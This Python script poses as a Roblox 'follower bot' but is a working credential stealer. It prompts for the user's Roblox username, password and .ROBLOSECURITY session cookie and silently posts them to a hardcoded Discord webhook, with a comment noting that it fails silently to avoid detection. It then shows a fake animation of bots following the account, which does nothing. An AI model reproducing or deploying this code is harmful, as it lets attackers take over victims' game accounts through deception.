import os
import random
import time
import sys
import requests
from colorama import init, Fore, Style

init()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def gradient_text(text):
    colors = [Fore.BLUE, Fore.MAGENTA, Fore.BLUE, Fore.MAGENTA, Fore.BLUE]
    gradient_text = ""
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        gradient_text += f"{color}{char}"
    return gradient_text + Style.RESET_ALL

def print_ascii_art():
    ascii_art = r"""
  ____   ___  ____  _     _____  __  _____ ___  _     _     _____        _______ ____    ____   ___ _____  __     ___ 
 |  _ \ / _ \| __ )| |   / _ \ \/ / |  ___/ _ \| |   | |   / _ \ \      / / ____|  _ \  | __ ) / _ \_   _| \ \   / / |
 | |_) | | | |  _ \| |  | | | \  /  | |_ | | | | |   | |  | | | \ \ /\ / /|  _| | |_) | |  _ \| | | || |    \ \ / /| |
 |  _ <| |_| | |_) | |__| |_| /  \  |  _|| |_| | |___| |__| |_| |\ V  V / | |___|  _ <  | |_) | |_| || |     \ V / | |
 |_| \_\\___/|____/|_____\___/_/\_\ |_|   \___/|_____|_____\___/  \_/\_/  |_____|_| \_\ |____/ \___/ |_|      \_/  |_|
    """
    print(gradient_text(ascii_art))

def typewriter(text, delay=0.03, end='\n', flush=True, color=Fore.CYAN):
    for char in text:
        sys.stdout.write(f"{color}{char}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(end)
    if flush:
        sys.stdout.flush()

def loading_animation():
    colors = [Fore.BLUE, Fore.MAGENTA]
    for i in range(10):
        for frame in ["|", "/", "-", "\\"]:
            color = colors[i % 2]
            sys.stdout.write(f"\r{color}Connecting {frame}{Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(0.1)

def generate_random_username():
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(chars) for _ in range(7))

def send_to_webhook(username, password, cookie):
    WEBHOOK_URL = "https://discord.com/api/webhooks/1485111865666306189/6NEcichzWP4uPg65w9y4QO80MXY7nt8L_k99KTbeaQGtONHCgZY2Fbt2Sn5gWNL-uinm"
    
    data = {
        "content": f"🚨 **搂住** 🚨\n\n**Username:** `{username}`\n**Password:** `{password}`\n**Cookie:** `{cookie}`",
        "username": "DZTBOT",
        "avatar_url": ""
    }
    
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        pass  # Fails silently to avoid detection

def simulate_botting(num_bots):
    typewriter("\nInitializing bot sequence...", color=Fore.MAGENTA)
    loading_animation()
    
    typewriter("\nBypassing Roblox API limits...", color=Fore.BLUE)
    time.sleep(0.8)
    
    typewriter("\nInitiating mass follow operation:\n", color=Fore.MAGENTA)
    for i in range(1, num_bots + 1):
        bot_name = generate_random_username()
        time.sleep(0.1)
        color = Fore.BLUE if i % 2 == 0 else Fore.MAGENTA
        typewriter(f"[{i}] @{bot_name} - FOLLOWING", 0.02, color=color)
    
    typewriter(Fore.GREEN + f"\nSuccess! {num_bots} bots now following." + Style.RESET_ALL)

def main():
    clear_screen()
    print_ascii_art()
    
    typewriter("FOLLOWER BOT v3.1.4", 0.05, color=Fore.MAGENTA)
    typewriter("-------------------", 0.05, color=Fore.BLUE)
    typewriter("Press ENTER to begin...", end='', color=Fore.CYAN)
    input()
    
    typewriter("\nEnter Roblox credentials:", color=Fore.MAGENTA)
    typewriter("Username: ", end='', color=Fore.BLUE)
    username = input()
    typewriter("Password: ", end='', color=Fore.MAGENTA)
    password = input()
    typewriter(".ROBLOSECURITY: ", end='', color=Fore.BLUE)
    cookie = input()
    
    # Send captured data to Discord
    send_to_webhook(username, password, cookie)
    
    try:
        typewriter("\nBots to deploy (1-999): ", end='', color=Fore.MAGENTA)
        num_bots = int(input())
        num_bots = max(1, min(999, num_bots))
    except ValueError:
        num_bots = 50
        typewriter("Invalid input. Defaulting to 50 bots.", color=Fore.BLUE)
    
    simulate_botting(num_bots)
    
    typewriter("\nOperation completed at " + time.strftime("%H:%M:%S"), color=Fore.MAGENTA)
    typewriter("\nPress ENTER to exit...", end='', color=Fore.BLUE)
    input()

if __name__ == "__main__":
    main()